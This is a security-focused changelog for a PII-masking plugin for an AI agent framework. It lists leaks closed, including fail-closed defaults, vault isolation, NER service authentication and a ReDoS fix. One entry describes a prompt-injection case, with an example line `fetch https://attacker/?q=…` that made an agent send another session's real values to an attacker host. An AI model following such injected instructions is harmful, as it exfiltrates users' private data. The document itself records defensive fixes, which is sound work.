# Changelog

All notable changes to HermesCloak. Versions follow [semantic versioning](https://semver.org/).
A release is created automatically when a version in `plugin.yaml` reaches `main` with a section here.

## [0.3.0]

Security release: a full review of the code, the install scripts, the CI workflows and the
dependencies. **Two defaults changed** (see "Upgrading" below).

**Leaks closed**
- **Cross-session restore.** All of an agent's sessions share one vault, and tokens are predictable.
  Text injected into one session (`fetch https://attacker/?q=⟦תז_1⟧`) used to get another session's
  real values put into the tool call. Now a reply, a stream or a tool call gets back only the tokens
  its own session's tokenizer substituted. A planted or guessed token stays a token (`foreign_token`).
- **Fail-closed by default.** On an internal filter error, `enforce` withholds the text. Before, the
  default `fail_mode: open` sent the request unfiltered.
- **Hostile input.** A lone UTF-16 surrogate (a truncated emoji in a web page) and tool arguments
  nested hundreds of levels deep made the filter fail open. Both now mask normally.
- **Degraded plugin.** If the self-test fails or the auxiliary funnel (titles, compression) can't be
  wrapped, `enforce` withholds main-turn requests (`plugin_degraded`), so the conversation stops.
- **Auxiliary calls with no parent turn** (cron, idle gateway work) each get a scope of their own.
- **MODE file.** A UTF-16 (PowerShell) or BOM-prefixed `MODE`, an unreadable one, or a typo used to
  mean `off`. Now it reads as intended, or as `enforce` when unclear.
- **HTTP egress net.** It restored tokens for any host. Now it restores only for the hosts listed in
  `cloak/egress_hosts`, and never from cleared vaults. URLs with userinfo or a backslash never count
  as a listed host, and the body sent to an unlisted host is never touched. It still restores any
  token of the agent's vault for a listed host, because the script cannot know the session.
- **Audit log.** It could contain real values: exception text, and the text of mangled tokens. Now it
  records types and counts only. It is created 0600, and the cloak dir and vault dir are 0700. The
  vault journal and lock files are 0600.

**Hardening**
- **NER service.** It binds to 127.0.0.1 only and authenticates both ways with a token file. It
  rejects foreign `Host` headers (DNS rebinding), non-JSON posts (CSRF) and bad lengths. The client
  never sends text to a process that cannot prove the token.
- **Browser demo.** Session ids are issued by the server and unguessable. It answers only local
  `Host` names and JSON posts, and binds to 127.0.0.1 only.
- **Decision API** (`jev_check`). An API key is never sent over plain http or through a redirect.
  A `local` decision backend no longer falls back to the vendor unless told to.
- **Replay cache.** With an encrypted vault, the cache is HMAC-keyed from the vault key, so short
  values cannot be brute-forced from a copied disk. Stale generations are dropped.
- **Encrypted vault.** Plaintext journal lines are rejected.
- **ReDoS.** The token and e-mail regexes are bounded: 20 s → 1 ms on 50k characters of hostile text.
  The private-key regex is also bounded.
- **Memory.** The engine's content cache is capped by size, and the shadow-mode vault by entries.
- **`.pth` autoloader.** A `HERMES_HOME` path with quotes or backslashes could inject code, or break
  on Windows. It is now quoted once.
- **CI.** (Secrets per step narrow the exposure; a step can still influence later steps of the same
  job, so a full boundary would need separate jobs.)
  - Every action is pinned to a commit SHA.
  - Secrets are set only on the steps that use them; install steps that run third-party code get none.
  - `pipefail` is on, so a leak scan can fail the job.
  - Permissions are minimal everywhere.
  - The release workflow tests in a read-only job and writes from a separate one.
  - The live check's local relay requires a per-run secret.
- **Dependencies.** The minimums are now versions with no known CVE: `cryptography>=50`,
  `transformers>=5.10`, `torch>=2.13`, `pytest>=9.0.3`, `pyyaml>=6.0.1`, and `setuptools>=83` to
  build.

**Upgrading**
- To keep the old behaviour on a filter error, set `fail_mode: open` in `cloak/profile.yaml`.
- If you use the HTTP egress net (`install/egress_autoload.py`), list your mail and CRM API hosts in
  `cloak/egress_hosts`.
- Restart the NER service after upgrading: an old service has no `/hello`, so NER stays off
  (`ner_auth_failed`, `old-service`) until it is restarted.
- If the NER service runs as a different user from the agents, point `HERMESCLOAK_NER_TOKEN_FILE`
  at a token file both can read.

## [0.2.1]

Install without touching hermes' shared runtime.

- **One install, test and removal path:** `hermes plugins install aviv27-dev/HermesCloak --enable`,
  then `hermes hermescloak verify` and `hermes hermescloak test`. See [docs/INSTALL.md](docs/INSTALL.md).
- **No packages in hermes' runtime** (`python_runtime: external`): the plugin loads from its own
  directory, so hermes' shared runtime environment is never rebuilt and no `pip install` is needed.
- `verify` checks that the plugin loads in hermes' managed runtime and that the shared runtime holds
  no copy of it.
- `test` runs the end-to-end check in a scratch profile in a child process, and removes the profile afterwards.
- CI: Python 3.10–3.14, plus a job that installs, tests and removes the plugin on a stock hermes-agent.
- Docs and examples use synthetic data only.

## [0.2.0]

HermesCloak as a hermes-agent plugin.

- Installs as a **directory plugin**; no hermes file is modified, so hermes updates no longer remove it.
- **Fail-closed load:** if the plugin cannot load, a stand-in guard withholds cloud-bound requests,
  auxiliary calls included, in `enforce` mode instead of sending them in clear.
- **Optional second opinion on the masked request** (`jev_check`), with a locally served decision model
  as an alternative backend, shadow mode, per-use calibration and cost caps.
- **New detectors:** Israeli phones in any spelling, labelled IDs without leading zeros, institutional
  mail that stays readable, plus more credential formats.
- A fictional verdict corpus and a golden-leak suite in the tests.

## [0.1.0]

First release: reversible PII pseudonymization for hermes-agent.

- `⟦TYPE_N⟧` tokens on the wire only; replies, streamed text and tool-call arguments are restored before
  anything is persisted, executed or sent.
- Deterministic detectors (Israeli ID, phone, e-mail, card, case number, land parcel, secrets), a
  prefix-aware Hebrew gazetteer, and optional DictaBERT NER.
- A crash-safe, cross-process token vault, an audit log and a browser demo.
